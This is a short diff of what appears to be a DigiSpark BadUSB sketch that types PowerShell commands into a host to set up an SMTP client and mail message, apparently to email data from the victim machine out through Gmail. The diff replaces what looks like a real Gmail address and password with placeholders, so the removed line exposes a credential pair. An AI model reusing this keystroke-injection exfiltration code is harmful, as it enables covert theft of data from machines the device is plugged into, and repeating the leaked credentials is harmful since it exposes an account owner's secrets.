@@ -73,7 +73,7 @@ void setup() {
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   printText(F("$SMTPInfo.EnableSsl = $true"));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  printText(F("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('cybersomething1@gmail.com', 'cadets23019953');"));
+  printText(F("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('username@gmail.com', 'passwordhere');"));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   printText(F("$ReportEmail = New-Object System.Net.Mail.MailMessage"));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
